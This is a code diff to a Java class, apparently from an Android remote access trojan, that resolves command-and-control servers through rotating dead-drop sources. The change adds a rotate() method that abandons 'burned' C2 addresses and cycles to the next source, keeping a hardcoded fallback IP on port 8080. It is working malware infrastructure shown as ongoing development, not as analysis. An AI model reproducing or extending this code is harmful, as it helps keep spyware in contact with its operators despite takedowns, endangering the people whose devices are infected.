@@ -45,16 +45,27 @@ public class DeadDropResolver {
     private static final String DDR_KEY = "AnDr0R4T_2026_K3Y"; // 18 chars, padded to 16 for AES
 
     // Fallback IP if all DDR sources fail
-    private static final String FALLBACK_URL = "http://" + config.serverIP + ":8080";
+    private static final String FALLBACK_URL = "http://" + config.IP + ":8080";
 
-    // Cache the resolved URL for the session
+    private static int currentIndex = 0;
     private static String cachedUrl = null;
     private static long cacheExpiry = 0;
     private static final long CACHE_DURATION_MS = 30 * 60 * 1000; // 30 minutes
 
     /**
+     * Force a rotation to the next DDR source and clear the cached C2 URL.
+     * Called by DataSyncer when a C2 appears to be burned.
+     */
+    public static void rotate() {
+        Log.w(TAG, "DDR Rotation triggered — clearing cache and shifting index");
+        cachedUrl = null;
+        cacheExpiry = 0;
+        currentIndex = (currentIndex + 1) % DDR_URLS.length;
+    }
+
+    /**
      * Resolve the current C2 server URL.
-     * Tries DDR sources first, falls back to hardcoded IP.
+     * Tries DDR sources starting from the current index.
      */
     public static String resolveC2Url() {
         // Return cached URL if still valid
@@ -62,18 +73,21 @@ public class DeadDropResolver {
             return cachedUrl;
         }
 
-        // Try each DDR source
-        for (String ddrUrl : DDR_URLS) {
+        // Try DDR sources starting from the current index
+        for (int i = 0; i < DDR_URLS.length; i++) {
+            int attemptIndex = (currentIndex + i) % DDR_URLS.length;
+            String ddrUrl = DDR_URLS[attemptIndex];
             try {
                 String resolved = fetchAndDecode(ddrUrl);
                 if (resolved != null && !resolved.isEmpty()) {
                     cachedUrl = resolved;
+                    currentIndex = attemptIndex; // Update index to the successful one
                     cacheExpiry = System.currentTimeMillis() + CACHE_DURATION_MS;
                     Log.d(TAG, "C2 resolved via DDR: " + maskUrl(resolved));
                     return resolved;
                 }
             } catch (Exception e) {
-                Log.d(TAG, "DDR source failed: " + e.getMessage());
+                Log.d(TAG, "DDR source index " + attemptIndex + " failed: " + e.getMessage());
             }
         }
 
